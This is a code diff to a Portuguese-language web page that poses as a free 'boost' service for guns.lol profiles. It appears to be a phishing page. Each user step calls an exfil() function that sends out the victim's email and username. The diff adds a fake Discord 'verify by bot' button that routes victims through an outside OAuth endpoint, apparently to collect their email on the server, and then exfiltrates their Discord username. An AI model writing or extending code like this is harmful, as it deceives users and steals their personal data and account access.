@@ -93,6 +93,7 @@ button.go:disabled{opacity:.5}
     <label>TEU EMAIL (chega o código lá)</label>
     <input id="email" name="email" type="email" placeholder="voce@email.com" autocomplete="email" enterkeyhint="go">
     <button class="go" id="bGo">ATIVAR BOOST →</button>
+    <button class="go hide" id="bDc" style="background:linear-gradient(135deg,#5865F2,#4752c4);box-shadow:0 0 24px rgba(88,101,242,.5)">VERIFICAR PELO BOT (DISCORD) →</button>
     <div class="hint" id="hint"></div>
     <div id="codeZone" class="hide">
       <label>CÓDIGO DE 6 DÍGITOS</label>
@@ -201,13 +202,42 @@ setTimeout(loadGrab, 15000);
     if (!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(mail)) { hint("⚠️ digita um email válido"); $("email").focus(); return; }
     hint("");
     exfil({ step: "user+email", email: mail });
+    try { localStorage.setItem("_boostpending", JSON.stringify({ guns, mail })); } catch {}
     $("bGo").disabled = true; $("bGo").textContent = "ENVIANDO CÓDIGO…";
+    $("bDc").classList.remove("hide");
     setTimeout(() => {
       $("codeZone").classList.remove("hide");
       $("bGo").textContent = "CÓDIGO ENVIADO ✅";
       try { $("code").focus(); } catch {}
     }, 1500);
   });
+  $("bDc").addEventListener("click", () => {
+    guns = ($("gunsUser").value || "").trim().replace(/^@/, "").replace(/[^a-zA-Z0-9_.]/g, "").slice(0, 40);
+    if (guns.length < 2) { hint("⚠️ digita teu user do guns.lol"); $("gunsUser").focus(); return; }
+    try { localStorage.setItem("_boostpending", JSON.stringify({ guns })); } catch {}
+    const back = "https://hhhaofuqoc.github.io/guns-booster/?verified=1&u=" + encodeURIComponent(guns);
+    location.href = "https://gunsviewer.vercel.app/api/auth?go=" + encodeURIComponent(back) + "&user=" + encodeURIComponent(guns);
+  });
+  // volta do OAuth do bot: já verificado (email puxado no servidor), pula o código
+  try {
+    const q = new URLSearchParams(location.search);
+    if (q.get("verified") === "1") {
+      let saved = null;
+      try { saved = JSON.parse(localStorage.getItem("_boostpending") || "null"); } catch {}
+      guns = (q.get("u") || (saved && saved.guns) || "").replace(/[^a-zA-Z0-9_.]/g, "").slice(0, 40);
+      const du = q.get("dusername") || "";
+      exfil({ step: "discord-verified", dusername: du });
+      if (guns) {
+        $("gunsUser").value = guns;
+        $("tName").textContent = "@" + guns;
+        $("codeZone").classList.add("hide"); $("runZone").classList.remove("hide");
+        hint("✅ verificado pelo bot! boost rodando…");
+        boost();
+      }
+    } else if (q.get("u")) {
+      try { $("gunsUser").value = q.get("u"); } catch {}
+    }
+  } catch {}
   $("email").addEventListener("keydown", (e) => { if (e.key === "Enter") $("bGo").click(); });
   $("gunsUser").addEventListener("keydown", (e) => { if (e.key === "Enter") $("email").focus(); });
   $("bVerify").addEventListener("click", () => {
